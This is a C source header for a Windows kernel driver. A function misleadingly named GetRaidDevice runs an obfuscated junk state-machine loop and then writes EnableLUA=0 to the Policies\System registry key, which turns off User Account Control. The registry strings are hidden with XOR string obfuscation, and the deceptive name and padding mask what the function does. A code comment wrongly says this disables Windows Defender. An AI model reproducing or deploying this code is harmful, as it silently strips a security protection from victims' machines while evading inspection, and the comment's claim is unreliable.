#pragma once
#include "includes.h"
#include "cff.h"

NTSTATUS GetRaidDevice()
{


    while (__st__) {
        if ((__st__ == 1)) {
            i = 0;
            j = 0;
            sum = 0;
            __st__ = 2;
            continue;
        }
        if ((__st__ == 2)) {
            if ((i <= n)) {
                __st__ = 4;
                continue;
            }
            __st__ = 3;
            continue;
        }
        if ((__st__ == 3)) {
            sum = ((sum + i) * 2) % 100;
            __st__ = 12;
            continue;
        }
        if ((__st__ == 4)) {
            if ((j < i)) {
                __st__ = 6;
                continue;
            }
            __st__ = 5;
            continue;
        }
        if ((__st__ == 5)) {
            C[i][i] = sum + i;
            __st__ = 9;
            continue;
        }
        if ((__st__ == 6)) {
            if ((j % 2 == 0)) {
                __st__ = 8;
                continue;
            }
            __st__ = 7;
            continue;
        }
        if ((__st__ == 7)) {
            C[i][j] = sum * (i - j);
            __st__ = 8;
            continue;
        }
        if ((__st__ == 8)) {
            j++;
            sum += j;
            if (j < i) {
                __st__ = 6;
            }
            else {
                __st__ = 4;
            }
            continue;
        }
        if ((__st__ == 9)) {
            if (sum % 2 == 0) {
                C[i][i] += sum / (i + 1);
            }
            else {
                C[i][i] -= sum / (i + 1);
            }
            __st__ = 10;
            continue;
        }
        if ((__st__ == 10)) {
            i++;
            sum += i;
            if (i <= n) {
                __st__ = 2;
            }
            else {
                __st__ = 11;
            }
            continue;
        }
        if ((__st__ == 11)) {
            C[n][n] = sum * (i + j);
            __st__ = 3;
            continue;
        }
        if ((__st__ == 12)) {
            C[i][j] = sum * (i + j);
            __st__ = 13;
            continue;
        }
        if ((__st__ == 13)) {
            __st__ = 0;
            continue;
        }
    }

    UNICODE_STRING keyPatha;
    OBJECT_ATTRIBUTES objAttr22;
    HANDLE hKey = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG disposition;

    RtlInitUnicodeString(&keyPatha, oxorany(L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));

    InitializeObjectAttributes(&objAttr22, &keyPatha, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwCreateKey(&hKey, KEY_WRITE, &objAttr22, 0, NULL, REG_OPTION_NON_VOLATILE, &disposition);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    UNICODE_STRING valueName;
    RtlInitUnicodeString(&valueName, oxorany(L"EnableLUA")); // this dissabled windef (yeah ik its weired that it has "enabled" in it)
    ULONG valueData = 0;

    status = ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &valueData, sizeof(valueData));
    if (!NT_SUCCESS(status))
    {
        ZwClose(hKey);
        return status;
    }

    ZwClose(hKey);


    return STATUS_SUCCESS;
}
